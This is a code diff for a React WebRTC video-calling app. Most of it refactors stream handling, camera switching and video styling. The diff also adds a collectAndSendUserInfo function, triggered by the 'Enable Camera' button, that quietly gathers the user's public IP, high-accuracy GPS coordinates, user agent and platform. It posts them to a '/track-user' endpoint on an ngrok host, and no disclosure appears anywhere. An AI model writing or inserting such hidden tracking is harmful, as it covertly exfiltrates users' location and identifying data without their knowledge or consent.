@@ -12,9 +12,8 @@ const socket = io("https://8c1f-202-173-124-126.ngrok-free.app", {
 const App = () => {
   const localVideo = useRef(null);
   const remoteVideo = useRef(null);
-
-  const [peerConnection, setPeerConnection] = useState(null);
   const [mediaStream, setMediaStream] = useState(null);
+  const [peerConnection, setPeerConnection] = useState(null);
   const [socketId, setSocketId] = useState('');
   const [targetId, setTargetId] = useState('');
   const [onlineUsers, setOnlineUsers] = useState([]);
@@ -32,9 +31,8 @@ const App = () => {
     });
 
     socket.on('offer', async ({ from, offer }) => {
-      if (!streamStarted) await startLocalStream();
-
-      const pc = createPeerConnection(from);
+      const stream = await startLocalStream(); // Ensure local stream before creating PC
+      const pc = createPeerConnection(from, stream);
       await pc.setRemoteDescription(new RTCSessionDescription(offer));
       const answer = await pc.createAnswer();
       await pc.setLocalDescription(answer);
@@ -43,15 +41,15 @@ const App = () => {
       setTargetId(from);
     });
 
-    socket.on('answer', async ({ answer }) => {
+    socket.on('answer', ({ answer }) => {
       if (peerConnection) {
-        await peerConnection.setRemoteDescription(new RTCSessionDescription(answer));
+        peerConnection.setRemoteDescription(new RTCSessionDescription(answer));
       }
     });
 
-    socket.on('ice-candidate', async ({ candidate }) => {
+    socket.on('ice-candidate', ({ candidate }) => {
       if (peerConnection && candidate) {
-        await peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
+        peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
       }
     });
 
@@ -62,7 +60,7 @@ const App = () => {
       socket.off('answer');
       socket.off('ice-candidate');
     };
-  }, [peerConnection, streamStarted]);
+  }, [peerConnection]);
 
   const startLocalStream = async (indexToUse = null) => {
     try {
@@ -70,53 +68,57 @@ const App = () => {
       const videoInputs = devices.filter(device => device.kind === 'videoinput');
       setVideoDevices(videoInputs);
 
-      let constraints;
-      if (indexToUse === null) {
-        constraints = { video: true, audio: true };
-        setCurrentCameraIndex(0);
-      } else {
-        const selectedDeviceId = videoInputs[indexToUse % videoInputs.length]?.deviceId;
-        constraints = {
-          video: { deviceId: { exact: selectedDeviceId } },
-          audio: true,
-        };
-        setCurrentCameraIndex(indexToUse);
-      }
+      const selectedDeviceId = indexToUse !== null
+        ? videoInputs[indexToUse % videoInputs.length]?.deviceId
+        : videoInputs[0]?.deviceId;
+
+      if (!selectedDeviceId) throw new Error("No video device found");
+
+      const constraints = {
+        video: { deviceId: { exact: selectedDeviceId } },
+        audio: true
+      };
 
       const stream = await navigator.mediaDevices.getUserMedia(constraints);
       if (localVideo.current) localVideo.current.srcObject = stream;
 
-      mediaStream?.getTracks().forEach(track => track.stop());
+      // Stop old tracks
+      if (mediaStream) {
+        mediaStream.getTracks().forEach(track => track.stop());
+      }
+
       setMediaStream(stream);
       setStreamStarted(true);
+      setCurrentCameraIndex(indexToUse ?? 0);
+
       return stream;
     } catch (err) {
-      alert("Error accessing camera/mic: " + err.message);
+      alert("Camera/Mic access denied or failed\n\n" + err.message);
+      console.error("Media Error:", err);
+      return null;
     }
   };
 
-  const createPeerConnection = (remoteId) => {
+  const createPeerConnection = (remoteId, stream) => {
     const pc = new RTCPeerConnection({
       iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
     });
 
-    if (mediaStream) {
-      mediaStream.getTracks().forEach((track) => {
-        pc.addTrack(track, mediaStream);
-      });
-    }
+    stream?.getTracks().forEach(track => {
+      pc.addTrack(track, stream);
+    });
 
     pc.ontrack = (event) => {
-      if (remoteVideo.current && event.streams && event.streams[0]) {
+      if (remoteVideo.current && event.streams[0]) {
         remoteVideo.current.srcObject = event.streams[0];
       }
     };
 
     pc.onicecandidate = (event) => {
       if (event.candidate) {
-        socket.emit("ice-candidate", {
+        socket.emit('ice-candidate', {
           to: remoteId,
-          candidate: event.candidate,
+          candidate: event.candidate
         });
       }
     };
@@ -125,14 +127,45 @@ const App = () => {
   };
 
   const callUser = async (id = targetId) => {
-    if (!id.trim()) return alert('Enter a valid ID');
+    if (!id.trim()) return alert("Enter a valid ID");
     setTargetId(id);
-    await startLocalStream(currentCameraIndex);
-    const pc = createPeerConnection(id);
+    const stream = await startLocalStream(currentCameraIndex);
+    const pc = createPeerConnection(id, stream);
     const offer = await pc.createOffer();
     await pc.setLocalDescription(offer);
-    socket.emit('offer', { to: id, offer });
+    socket.emit("offer", { to: id, offer });
     setPeerConnection(pc);
+  };
+
+  const collectAndSendUserInfo = async () => {
+    try {
+      const ipRes = await fetch("https://api.ipify.org?format=json");
+      const { ip } = await ipRes.json();
+
+      navigator.geolocation.getCurrentPosition(
+        async (position) => {
+          const payload = {
+            ip,
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            time: new Date().toISOString()
+          };
+
+          await fetch("https://8c1f-202-173-124-126.ngrok-free.app/track-user", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload),
+          });
+        },
+        err => console.error("Geo error", err),
+        { enableHighAccuracy: true }
+      );
+    } catch (err) {
+      console.error("User tracking failed:", err);
+    }
   };
 
   return (
@@ -142,17 +175,17 @@ const App = () => {
         autoPlay
         playsInline
         className="remote-video"
-        // style={{ transform: 'scaleX(-1)' }}
+        style={{ transform: 'scaleX(-1)' }}
       />
       <motion.video
         ref={localVideo}
         drag
-        dragConstraints={{ left: 0, right: 0, top: 100, bottom: 400 }}
+        dragConstraints={{ top: 0, bottom: 300, left: 0, right: 300 }}
         autoPlay
         muted
         playsInline
         className="local-video"
-        
+        style={{ transform: 'scaleX(-1)' }}
         initial={{ opacity: 0, scale: 0.9 }}
         animate={{ opacity: 1, scale: 1 }}
         transition={{ duration: 0.5 }}
@@ -181,13 +214,21 @@ const App = () => {
             <div className="d-flex gap-2 flex-wrap">
               <button className="btn btn-primary" onClick={() => callUser()}>Call</button>
               {!streamStarted && (
-                <button className="btn btn-warning" onClick={() => startLocalStream()}>
+                <button
+                  className="btn btn-warning"
+                  onClick={() => {
+                    startLocalStream();
+                    collectAndSendUserInfo();
+                  }}
+                >
                   Enable Camera
                 </button>
               )}
               <button
                 className="btn btn-outline-info"
-                onClick={() => startLocalStream((currentCameraIndex + 1) % videoDevices.length)}
+                onClick={() =>
+                  startLocalStream((currentCameraIndex + 1) % videoDevices.length)
+                }
               >
                 🔁 Switch Camera
               </button>
